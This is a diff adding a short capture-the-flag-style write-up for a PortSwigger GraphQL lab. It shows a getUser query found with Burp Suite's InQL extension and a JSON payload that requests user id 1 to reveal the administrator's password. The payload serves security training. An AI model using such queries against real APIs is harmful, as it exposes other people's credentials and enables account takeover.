@@ -1,0 +1,17 @@
+The JSON payload below is meant to solve the following lab:
+https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure
+
+Using the InQL extension in BurpSuite we'll see the following query:
+
+query {
+	getUser(id:1334) {
+		password
+		id
+		username
+	}
+}
+
+Changing the id value to 1 will reveal the administrators password.
+
+Payload:
+{"query": "query {\n\tgetUser(id:1) {\n\t\tpassword\n\t\tid\n\t\tusername\n\t}\n}"}
